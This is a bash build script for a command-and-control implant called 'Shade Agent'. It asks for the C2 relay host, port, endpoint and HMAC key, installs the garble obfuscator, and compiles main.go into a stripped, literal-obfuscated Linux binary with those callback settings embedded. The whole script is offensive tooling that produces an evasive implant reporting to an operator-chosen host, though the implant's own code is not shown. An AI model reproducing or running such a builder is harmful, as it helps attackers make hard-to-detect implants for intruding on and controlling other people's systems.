#!/bin/bash

echo "=========================================="
echo "    Shade Agent Builder (Garble)"
echo "=========================================="
echo ""

# Prompt for configuration
read -p "C2 Relay Host [localhost]: " C2_HOST
C2_HOST=${C2_HOST:-localhost}

read -p "C2 Relay Port [2222]: " C2_PORT
C2_PORT=${C2_PORT:-2222}

read -p "C2 Endpoint [/wiki]: " C2_ENDPOINT
C2_ENDPOINT=${C2_ENDPOINT:-/wiki}

read -p "HMAC Key (hex): " HMAC_KEY

if [ -z "$HMAC_KEY" ]; then
    echo "[ERROR] HMAC key is required!"
    exit 1
fi

echo ""
echo "Configuration:"
echo "  Host:     $C2_HOST"
echo "  Port:     $C2_PORT (SSH)"
echo "  Endpoint: $C2_ENDPOINT"
echo "  HMAC Key: ${HMAC_KEY:0:16}...${HMAC_KEY: -8}"
echo ""

# Check if garble is installed
if ! command -v garble &> /dev/null; then
    echo "[*] Garble not found. Installing..."
    go install mvdan.cc/garble@latest
    if [ $? -ne 0 ]; then
        echo "[ERROR] Failed to install garble"
        exit 1
    fi
    echo "[+] Garble installed successfully"
fi

echo "[*] Building with garble obfuscation..."

# Build with garble for Linux
GOOS=linux GOARCH=amd64 garble -literals -tiny build \
    -ldflags "-s -w -X main.listenerHost=$C2_HOST -X main.listenerPort=$C2_PORT -X main.listenerEndpoint=$C2_ENDPOINT -X main.hmacKeyHex=$HMAC_KEY" \
    -o shade-agent main.go

if [ $? -eq 0 ]; then
    echo ""
    echo "[SUCCESS] Build complete: shade-agent"
    echo ""
    ls -lh shade-agent
    chmod +x shade-agent
else
    echo ""
    echo "[ERROR] Build failed!"
    exit 1
fi

